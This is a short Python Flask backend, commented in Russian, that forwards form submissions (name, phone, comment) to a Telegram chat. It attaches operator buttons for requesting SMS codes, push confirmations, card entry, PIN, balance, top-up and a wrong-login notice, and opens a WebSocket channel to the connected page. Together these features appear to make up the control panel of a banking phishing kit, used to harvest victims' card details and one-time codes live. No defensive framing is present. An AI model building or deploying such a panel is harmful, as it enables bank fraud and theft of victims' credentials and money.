import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# ✅ Создаём Flask-приложение
app = Flask(__name__)
CORS(app)

# ✅ WebSocket
socketio = SocketIO(app, cors_allowed_origins="*")

# ✅ Переменные окружения
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    raise ValueError("❌ Ошибка: TELEGRAM_BOT_TOKEN или CHAT_ID не установлены!")

print(f"✅ Загружен TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"✅ Загружен CHAT_ID: {CHAT_ID}")

# ✅ Отправка данных в Telegram
@app.route("/send-to-telegram", methods=["POST"])
def send_to_telegram():
    try:
        data = request.json
        print(f"📩 Получены данные: {data}")

        message_text = f"📩 Новый запрос:\n\nИмя: {data['name']}\nТелефон: {data['phone']}\nКомментарий: {data['comment']}"

        # 📌 Кнопки меню
        keyboard = {
            "inline_keyboard": [
                [{"text": "SMS", "callback_data": "redirect_sms"},
                 {"text": "Пуш", "callback_data": "push"},
                 {"text": "Ввод карты", "callback_data": "card"},
                 {"text": "PIN", "callback_data": "pin"}],
                [{"text": "Лимиты", "callback_data": "limits"},
                 {"text": "Неверный код", "callback_data": "wrong_code"},
                 {"text": "Номер телефона", "callback_data": "phone_number"}],
                [{"text": "Свой текст/фото", "callback_data": "custom_text"}],
                [{"text": "Пополнение", "callback_data": "topup"},
                 {"text": "Баланс", "callback_data": "balance"}],
                [{"text": "✅ Успех", "callback_data": "success"},
                 {"text": "❌ Неверный ЛК", "callback_data": "wrong_lk"}]
            ]
        }

        # 📩 Запрос в Telegram
        payload = {
            "chat_id": CHAT_ID,
            "text": message_text,
            "reply_markup": keyboard
        }

        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload)

        print(f"📩 Ответ от Telegram: {response.status_code}, {response.text}")

        if response.status_code == 200:
            return jsonify({"success": True, "message": "✅ Данные отправлены!"}), 200
        else:
            return jsonify({"success": False, "error": response.text}), response.status_code

    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ✅ WebSocket обработчики
@socketio.on("connect")
def handle_connect():
    print("✅ WebSocket подключен!")


@socketio.on("disconnect")
def handle_disconnect():
    print("❌ WebSocket отключен!")


# ✅ Запуск сервера
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False, allow_unsafe_werkzeug=True)

